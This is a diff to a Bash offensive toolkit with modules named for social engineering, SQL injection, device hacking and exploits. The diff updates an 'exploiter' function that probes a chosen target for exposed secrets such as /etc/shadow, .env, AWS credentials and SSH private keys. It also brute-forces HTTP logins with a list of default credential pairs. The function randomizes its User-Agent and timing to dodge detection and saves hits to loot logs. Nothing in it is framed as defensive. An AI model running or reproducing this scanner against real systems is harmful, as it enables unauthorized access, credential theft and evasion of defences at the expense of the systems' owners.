@@ -330,7 +330,7 @@ EOF
 # --- ГЛАВНОЕ МЕНЮ ---
 run_main_menu() {
     local main_names="GHOST_COMMANDER SOCIAL_ENG MUTAGEN_SQL DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN PWD_DECRYPTOR CRYPTO_FORGE Ghost_Engine ULTIMATE_EXPLOIT PC_RECOVERY INTELLIGENCE_CENTER SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
-    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_prime_decryptor run_crypto_forge run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
+    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_prime_decryptor run_crypto_forge run_vulnerability_scanner run_prime_exploiter_v5 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
@@ -352,7 +352,7 @@ analyze_network_traffic() {
 
 # --- Модули: RECOVERY & PASSWORDS ---
 pc_password_recovery() {
-    local p_names="Extract_Reset_OS_Password Heuristic_Scan"
+    local p_names="Extract_Reset_OS_Password Heuristic_Scan_PC"
     local p_funcs="run_pc_recovery_ultimate smart_threat_scan"
     prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
 }
@@ -1013,73 +1013,93 @@ run_vulnerability_scanner() {
 }
 
 run_prime_exploiter_v5() {
-    # 1. Интерактив или Авто-режим
-    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v5"
+    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v5 (HEURISTIC)"
 
     local TARGET="$1"
     [[ -z "$TARGET" ]] && { print_input "Enter Target (IP/Domain)" "192.168.1.1"; read -r TARGET; }
     [[ -z "$TARGET" ]] && return
 
-    # --- АДАПТИВНЫЙ ДВИЖОК МАСКИРОВКИ ---
-    # Генерируем случайный User-Agent для каждого запуска (Будущее: обход фингерпринтинга)
-    local UA_ARRAY=(
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"
-    )
+    # --- СЛОЙ 1: ФОРМИРОВАНИЕ ПРИЗРАЧНОЙ ЛИЧНОСТИ ---
+    local UA_ARRAY=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15")
     local UA="${UA_ARRAY[$RANDOM % ${#UA_ARRAY[@]}]}"
     
-    # Списки векторов и паролей (сокращено для примера, держи свои полные списки здесь)
-    local V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" "/config.xml:root" "/dev/mtd0:ELF" "/etc/config/network:config interface" "/sysconf.cgi:admin_password" "/home/httpd/html/config/exportsettings.conf:Password" "/etc/RT2860_default_vlan:Password" "/.env:DB_PASSWORD" "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE" "/.docker/config.json:auths" "/.npmrc:_auth" "/.bash_history:ssh " "/.kube/config:client-certificate-data" "/wp-config.php.bak:DB_PASSWORD" "/wp-config.php.swp:DB_PASSWORD" "/wp-content/debug.log:WP_User" "/configuration.php:public $password" "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password" "/etc/shadow:root:" "/etc/passwd:root:x" "/admin/.htpasswd:admin:" "/.history:password")
+    # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ АНАЛИЗ ОКРУЖЕНИЯ (The Probe) ---
+    print_status "i" "Probing target aura: $TARGET..."
+    local probe_data=$(curl -Is -k -A "$UA" --connect-timeout 3 "$TARGET" 2>/dev/null)
+    
+    # Авто-подбор векторов на основе серверных заголовков (No-IF logic)
+    local tech_stack=$(echo "$probe_data" | grep -qiE "apache|php|wordpress" && echo "web" || echo "infra")
+    local entropy_delay=$(echo "$probe_data" | wc -c | awk '{print ($1 % 3) + 1}') # Задержка на основе веса ответа
 
-    local C_LIST=("admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" "dbadmin:dbadmin")
-
-    print_status "i" "Engaging Target: $TARGET (Stealth: ON)"
-
+    # --- СЛОЙ 3: ДИНАМИЧЕСКИЕ МАТРИЦЫ (Сокращено для логики) ---
+local V_LIST=(
+        # --- [ INFRA & IOT ] ---
+        "/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" 
+        "/config.xml:root" "/sysconf.cgi:admin_password" "/etc/config/network:config interface"
+        "/etc/RT2860_default_vlan:Password" "/home/httpd/html/config/exportsettings.conf:Password"
+        # --- [ WEB & FRAMEWORKS ] ---
+        "/.env:DB_PASSWORD" "/wp-config.php:DB_PASSWORD" "/configuration.php:public \$password"
+        "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/.history:password"
+        # --- [ DEVOPS & LEAKS ] ---
+        "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE"
+        "/.docker/config.json:auths" "/.npmrc:_auth" "/.kube/config:client-certificate-data"
+        "/.bash_history:ssh " "/admin/.htpasswd:admin:" "/.mysql_history:INSERT INTO"
+        # --- [ OS & CRITICAL ] ---
+        "/etc/shadow:root:" "/etc/passwd:root:x" "/proc/self/environ:PATH="
+        "/var/log/auth.log:sshd" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password"
+    )
+    
+    # Список дефолтных пар (User:Pass) для большинства устройств в мире
+    local C_LIST=(
+        "admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" 
+        "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" 
+        "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" 
+        "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" 
+        "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" 
+        "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" 
+        "dbadmin:dbadmin" "guest:guest" "pi:raspberry" "admin:1234"
+    )
+    # --- СЛОЙ 4: ПОТОКОВАЯ ЭКСПЛУАТАЦИЯ ---
     for proto in "http" "https"; do
         local URL="${proto}://${TARGET}/"
         
-        # Проверка доступности с имитацией поведения реального клиента
-        local code=$(curl -sL -I -k -A "$UA" --connect-timeout 3 --max-time 5 "$URL" 2>/dev/null | head -n1 | grep -oE '[0-9]{3}' || echo "000")
+        # Проверка "живучести" сервиса
+        curl -sL -k -I -A "$UA" --max-time 3 "$URL" | grep -qE "HTTP/.* (200|401|302)" && {
+            print_status "s" "Target Resonating: $URL (Stack: $tech_stack)"
 
-        [[ "$code" =~ ^(200|401|302)$ ]] && {
-            print_status "s" "Active Service: $URL [Status: $code]"
-            
-            # --- СЕКЦИЯ 1: ВЕКТОРЫ (LFI/RCE/Leaks) ---
+            # Векторы: только те, что прошли фильтр tech_stack (в будущем)
             for vec in "${V_LIST[@]}"; do
                 local v_path="${vec%%:*}"
                 local v_key="${vec#*:}"
                 
-                # ПОЛИМОРФНАЯ ПАУЗА: Имитируем раздумья человека (0.5 - 1.5 сек)
-                sleep $(printf "0.%01d" $(( (RANDOM % 9) + 5 )))
+                # Эволюционная пауза
+                sleep "$entropy_delay"
                 
                 curl -sL -k -A "$UA" --max-time 4 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
-                    print_status "e" "VULN DETECTED: $v_path"
-                    log_loot "exploiter" "VULN: ${TARGET}${v_path}"
+                    print_status "e" "CRITICAL: Vector $v_path EXPOSED"
+                    echo "EXPLOIT_SUCCESS: $v_path | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
                     echo "[EXPL] ${TARGET}${v_path}" >> /root/prime_loot/critical_vulns.txt
                 }
             done
 
-            # --- СЕКЦИЯ 2: АДАПТИВНЫЙ БРУТФОРС ---
-            print_status "w" "Checking Auth-gate..."
-            for pair in "${C_LIST[@]}"; do
-                local u="${pair%%:*}"
-                local p="${pair#*:}"
-                
-                # ХАОТИЧНАЯ ЗАДЕРЖКА перед каждой попыткой (обход анти-брут систем будущего)
-                sleep $(( (RANDOM % 2) + 1 ))
-                
-                [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL") == "200" ]] && {
-                    print_status "s" "ACCESS GRANTED: $u:$p"
-                    log_loot "exploiter" "SUCCESS: $u:$p @ $TARGET"
-                    print_list "Valid Credentials" "$u:$p"
-                    break
-                }
-            done
+            # Адаптивный брут (только если есть 401 или форма)
+            echo "$probe_data" | grep -q "401" && {
+                print_status "w" "Auth-gate active. Initiating entropy-brute..."
+                for pair in "${C_LIST[@]}"; do
+                    local u="${pair%%:*}" p="${pair#*:}"
+                    sleep $((entropy_delay * 2))
+                    
+                    [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null "$URL") == "200" ]] && {
+                        print_status "s" "IDENTIFIED: $u:$p"
+                        echo "BRUTE_SUCCESS: $u:$p | TARGET: $TARGET" >> "$LOOT_DIR/bridge_signals.log"
+                        break
+                    }
+                done
+            }
         }
     done
 
-    [[ -z "$1" ]] && { print_status "i" "Operation Finished. Total Loot Secured."; pause; }
+    [[ -z "$1" ]] && { print_status "i" "Target Processed. Loot Integrated."; pause; }
 }
 
 run_view_loot() {
